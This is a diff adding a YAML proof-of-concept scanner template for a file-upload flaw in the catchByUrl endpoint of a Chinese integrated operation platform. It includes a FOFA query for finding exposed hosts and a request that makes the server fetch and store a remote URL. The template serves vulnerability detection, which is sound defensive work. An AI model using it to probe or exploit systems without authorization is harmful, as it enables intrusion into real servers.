@@ -1,0 +1,16 @@
+id: poc-yaml-integrated-operation-platform-icatchbyurl-upload
+info:
+  name: 北京中科聚网一体化运营平台catchByUrl接口存在文件上传漏洞
+  severity: high
+  tags:
+  - 任意写入
+  finger: 一体化运营平台
+  fofa: body="thirdparty/ueditor/WordPaster"
+requests:
+- method: GET
+  path: /resources/files/ue/catchByUrl?url=https://www.baidu.com
+  expression: "status_code == 200 && \ncontains(body,\"\\\"url\\\":\\\"/files/headimg/\"\
+    ) &&\ncontains(body,\"\\\"original\\\":\\\"www.baidu.com\\\"\") &&\n!contains(body,\"\
+    <\")\n"
+variables: {}
+transport: http
